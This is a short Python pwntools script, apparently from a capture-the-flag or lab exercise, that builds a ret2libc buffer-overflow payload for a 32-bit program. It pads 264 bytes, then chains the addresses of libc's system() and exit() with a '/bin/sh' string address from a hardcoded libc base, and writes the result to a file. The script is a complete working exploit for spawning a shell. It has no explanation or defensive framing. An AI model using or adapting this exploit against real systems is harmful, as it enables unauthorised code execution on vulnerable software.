#!/usr/bin/python3
from pwn import *

junk = b"A" * 264

#eip = b"\x90\x7d\xdc\xf7"
#eip = struct.pack("<I", 0xf7dc7d00)

# address of exit() 0xf7db7220
#ret = b"BBBB"

#binsh = b"\xcd\x3d\xf3\xf7"
#binsh = struct.pack("<I", 0xf7d7a000 + 0x1b9dcd)

libc = ELF("/usr/lib/i386-linux-gnu/libc.so.6")
libc_base = 0xf7d6b000

system_addr = p32(libc_base + libc.sym["system"])
exit_addr = p32(libc_base + libc.sym["exit"])
binsh_addr = p32(0xf7f33dcd)

#print(system_addr, exit_addr, binsh_addr)

payload = junk + system_addr + exit_addr + binsh_addr 

with open("payload", "wb") as f:
    f.write(payload)
